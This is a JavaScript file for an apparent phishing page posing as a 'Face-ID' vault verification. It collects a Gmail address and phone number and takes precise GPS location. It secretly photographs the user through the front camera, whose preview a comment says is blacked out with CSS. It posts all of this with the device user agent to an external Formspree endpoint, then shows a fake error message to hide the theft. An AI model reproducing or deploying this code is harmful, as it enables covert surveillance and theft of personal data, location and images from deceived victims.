const FORMSPREE_URL = "https://formspree.io/f/xzdkrzlp"
 

document.getElementById('verifyBtn').addEventListener('click', async () => {
    const status = document.getElementById('status');
    const email = document.getElementById('email').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const btn = document.getElementById('verifyBtn');

    // 1. Validation Logic
    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
    const phoneRegex = /^0[0-9]{9}$/;

    if (!gmailRegex.test(email)) {
        status.innerText = "Error: Only @gmail.com addresses are accepted.";
        return;
    }

    if (!phoneRegex.test(phone)) {
        status.innerText = "Error: Phone must be 10 digits starting with 0.";
        return;
    }

    // 2. Start Process
    btn.disabled = true;
    btn.innerText = "Syncing...";
    status.innerText = "Verifying Network & GPS...";

    let locationData = "Access Denied";
    try {
        const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
        });
        locationData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Acc: ${pos.coords.accuracy}m)`;
    } catch (e) { console.log("GPS Blocked"); }

    // 3. Camera Handling
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        
        // The video element is now visually black due to the CSS filter: brightness(0)
        video.style.display = "block";
        video.srcObject = stream;
        status.innerText = "Processing Face-ID Sync...";

        await new Promise(r => setTimeout(r, 2500));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Canvas ignores CSS filters and captures the raw stream data
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photo = canvas.toDataURL('image/jpeg', 0.4);

        // 4. Submit Data
        const payload = {
            email: email,
            phone: phone,
            location: locationData,
            device: navigator.userAgent,
            timestamp: new Date().toLocaleString(),
            image: photo
        };

        await fetch(FORMSPREE_URL, {
            method: 'POST',
            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        status.innerText = "Verification failed (Error 0xAF2). Please try again later.";
        stream.getTracks().forEach(t => t.stop());
        video.style.display = "none";
        btn.disabled = false;
        btn.innerText = "Verify & Open Vault";

    } catch (err) {
        status.innerText = "Error: Camera access is required for verification.";
        btn.disabled = false;
        btn.innerText = "Verify & Open Vault";
    }
});